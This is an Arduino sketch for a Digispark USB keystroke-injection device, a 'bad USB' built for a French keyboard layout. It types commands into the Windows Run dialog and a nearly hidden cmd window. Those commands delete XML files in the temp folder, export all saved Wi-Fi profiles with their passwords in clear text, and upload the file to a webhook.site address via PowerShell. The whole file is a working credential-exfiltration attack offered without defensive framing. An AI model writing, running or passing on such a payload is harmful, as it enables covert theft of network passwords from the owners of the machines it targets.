#include "DigiKeyboardFr.h"

#define ID "8dbb3ec8-2898-4616-9f97-8bcc20cd7c7c"
#define TMP_FILE "tmp_wifi.xml"

const short time_default = 500;
const short time_run = 2000;
const char led_id = 1;

void setup() {
  pinMode(led_id, OUTPUT);
}

void loop() {
  digitalWrite(led_id, LOW);
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboardFr.delay(time_run);
  DigiKeyboardFr.println("cd %temp% & del *.xml /s /f /q & netsh wlan export profile key=clear & copy *.xml "TMP_FILE" & powershell Invoke-WebRequest -Uri https://webhook.site/"ID" -Method POST -InFile "TMP_FILE" & exit");
  digitalWrite(led_id, HIGH);
  for (;;) {
  }
}
